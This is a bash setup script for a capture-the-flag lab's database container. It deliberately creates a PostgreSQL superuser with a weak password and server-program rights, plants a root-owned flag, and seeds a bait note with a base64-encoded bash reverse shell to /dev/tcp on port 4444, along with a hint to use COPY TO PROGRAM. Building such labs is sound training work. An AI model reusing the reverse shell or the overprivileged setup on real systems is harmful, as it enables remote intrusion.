#!/usr/bin/env bash
# ROLE=db — runs PostgreSQL, overprivileged `appuser`, the bait note, and the
# root-owned flag tree. Everything is idempotent so a container restart is a
# no-op.
#
# The player path is: shell in ctf-db as OS user `postgres` (COPY ... TO
# PROGRAM), find /usr/local/.sys_cache_7f3a2b/flag.txt, `cat` it. The flag is
# staged here at instance start and is never baked into the image; the RCE
# user (uid 999 postgres) still cannot read /proc/1/environ of root.
set -euo pipefail

FLAG="${RCTF_FLAG:-${FLAG:-}}"
PG_VER=14

# --- 1. plant the root-owned files -------------------------------------------
mkdir -p /critical /usr/local/.sys_cache_7f3a2b
install -m 0644 -o root -g root /opt/escape/sysadmin_note.txt /critical/.sysadmin_note.txt
if [ -n "$FLAG" ]; then
    printf '%s\n' "$FLAG" > /usr/local/.sys_cache_7f3a2b/flag.txt
    chown root:root /usr/local/.sys_cache_7f3a2b/flag.txt
    chmod 0644      /usr/local/.sys_cache_7f3a2b/flag.txt
fi

# --- 2. bring the cluster up --------------------------------------------------
pg_ctlcluster "$PG_VER" main start
for _ in $(seq 1 30); do
    if runuser -u postgres -- psql -qAtc 'SELECT 1' >/dev/null 2>&1; then break; fi
    sleep 1
done
runuser -u postgres -- psql -qAtc 'SELECT 1' >/dev/null

# --- 3. the overprivileged dev account ---------------------------------------
if ! runuser -u postgres -- psql -qAtc "SELECT 1 FROM pg_roles WHERE rolname='appuser'" | grep -q 1; then
    runuser -u postgres -- psql -c "CREATE ROLE appuser LOGIN SUPERUSER PASSWORD 'devpass123'"
fi
runuser -u postgres -- psql -c 'GRANT pg_execute_server_program TO appuser' >/dev/null
runuser -u postgres -- psql -c 'GRANT pg_read_server_files     TO appuser' >/dev/null
runuser -u postgres -- psql -c 'GRANT pg_write_server_files    TO appuser' >/dev/null
if ! runuser -u postgres -- psql -qAtc "SELECT 1 FROM pg_database WHERE datname='appdb'" | grep -q 1; then
    runuser -u postgres -- createdb -O appuser appdb
fi

# --- 4. the note points at a REAL listener IP ---------------------------------
# Resolve `entry` (the player's SSH host) on the internal network and build the
# base64 payload exactly like the author's package does, but always working in
# the per-instance network. Falls back to the service name if DNS is cold.
LISTEN_IP=""
for _ in $(seq 1 90); do
    LISTEN_IP=$(getent hosts entry | awk 'NR==1 {print $1}')
    [ -n "$LISTEN_IP" ] && break
    sleep 2
done
LISTEN="${LISTEN_IP:-entry}"
PAYLOAD_B64=$(printf 'bash -c "bash -i >& /dev/tcp/%s/4444 0>&1"' "$LISTEN" | base64 -w0)

runuser -u postgres -- psql -qAt -d appdb <<SQL
CREATE TABLE IF NOT EXISTS logs (
    id SERIAL PRIMARY KEY,
    message TEXT,
    created_at TIMESTAMP DEFAULT NOW()
);
INSERT INTO logs (message) VALUES ('App initialized');
CREATE TABLE IF NOT EXISTS maintenance_notes (
    id SERIAL PRIMARY KEY,
    note TEXT,
    author TEXT,
    created_at TIMESTAMP DEFAULT NOW()
);
INSERT INTO maintenance_notes (note, author)
SELECT \$note\$Reminder to the team: appuser still has SUPERUSER from the dev days - we forgot to revoke it. If someone needs to run a quick maintenance command without SSH access, learn about this "COPY TO PROGRAM " for SUPERUSER ***USE THIS****[${PAYLOAD_B64}] ".\$note\$, 'devops-team'
WHERE NOT EXISTS (SELECT 1 FROM maintenance_notes);
SQL

# --- 5. keep the container alive; drop the flag vars from PID1 env ------------
exec env -u FLAG -u RCTF_FLAG tail -f /dev/null
